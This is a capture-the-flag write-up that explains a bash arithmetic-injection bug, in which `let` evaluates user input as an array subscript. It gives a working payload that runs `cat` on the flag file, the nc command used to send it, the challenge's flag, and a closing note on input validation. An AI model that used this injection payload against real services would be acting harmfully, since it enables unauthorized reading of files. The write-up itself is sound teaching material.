# Bish Bash Bosh (Misc)

## The challenge

> *Let* me just quickly bash something together so you can't get my `/flag/flag.txt`.

A TCP service (socat) runs this script for every connection:

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

The flag is element 0 of the array, and the range check blocks index 0.

## The bug

The italic *Let* in the description is the hint. `let` evaluates its argument as a **bash arithmetic expression**, and our input is placed into it unquoted.

In bash arithmetic, an array subscript like `a[...]` is itself evaluated, and a command substitution `$(...)` inside the subscript is executed. So the input is not just a number: it can run a command before the range check ever happens.

## Exploit

Payload:

```
a[$(cat${IFS}/flag/flag.txt>&0)]
```

- `${IFS}` replaces the space (spaces would split the argument).
- `>&0` sends `cat`'s output to file descriptor 0. With socat `EXEC`, stdin is the network socket, so the output comes straight back to us.
- After that the script still prints `Nuh uh`, but the flag is already sent.

```bash
printf '%s\n' 'a[$(cat${IFS}/flag/flag.txt>&0)]' | nc -N HOST 9000
```

Output:

```
What message would you like to see? (0..2)
PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}Nuh uh
```

I tested the payload locally on a copy of the script before sending it once to the target.

## Flag

`PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}`

## Takeaway

Never pass user input to `let`, `(( ))` or `$(( ))` in bash. Validate it first, for example with `[[ $i =~ ^[0-9]+$ ]]`, before any arithmetic.
